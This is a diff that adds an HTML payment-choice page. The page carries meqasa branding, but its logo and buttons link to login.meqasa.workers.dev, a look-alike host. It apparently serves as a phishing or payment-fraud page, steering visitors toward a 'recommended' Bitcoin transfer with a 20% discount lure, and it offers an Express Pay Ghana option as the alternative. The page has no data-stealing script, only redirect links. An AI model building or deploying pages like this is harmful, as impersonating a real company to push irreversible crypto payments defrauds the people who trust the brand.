@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Choose Your Payment Option</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f7fb;
+      color: #222;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 60px auto;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 36px;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      color: #666;
+      margin-bottom: 40px;
+    }
+
+    .options {
+      display: flex;
+      gap: 25px;
+      justify-content: center;
+    }
+
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 30px;
+      width: 320px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+      position: relative;
+    }
+
+    .preferred {
+      border: 3px solid #2563eb;
+      transform: scale(1.03);
+    }
+
+    .badge {
+      position: absolute;
+      top: -15px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #2563eb;
+      color: white;
+      padding: 7px 16px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    .discount {
+      color: #16a34a;
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      background: #2563eb;
+      color: white;
+    }
+
+    .secondary button {
+      background: #e5e7eb;
+      color: #222;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    @media (max-width: 700px) {
+      .options {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .card {
+        width: 80%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <body>
+
+  <header class="site-header">
+    <a href="https://login.meqasa.workers.dev/pay">
+      <img src="newindex_files/meqasa-logo-4.png" alt="Your Company Logo" class="logo">
+    </a>
+  </header>
+
+  <div class="container">
+
+    <p class="subtitle">Select the option that works best for you.</p>
+
+    <div class="options">
+
+      <!-- Preferred Option -->
+      <div class="card preferred">
+        <div class="badge">RECOMMENDED</div>
+        <img src="newindex_files/bitcoin1.png" alt="Description of image">
+        <h2>Bitcoin Transfer</h2>
+        <p>Our preferred choice with great value.</p>
+        <p class="discount">20% OFF</p>
+        <p>Get the full benefits at a discounted price.</p>
+        <button onclick="window.location.href='https://login.meqasa.workers.dev/bitcoin'">
+          Bitcoin
+        </button>
+      </div>
+
+      <!-- Alternative Option -->
+      <div class="card secondary">
+      <img src="newindex_files/expressghana.png" alt="Description of image">
+        <h2>Option 2</h2>
+        <p>A simple alternative if Option A isn't right for you.</p>
+        <p>No discount</p>
+        <p>Choose this option if you prefer the alternative.</p>
+        <button onclick="window.location.href='https://login.meqasa.workers.dev/expressghana'">
+          Express Pay Ghana
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+</body>
+</html>
+
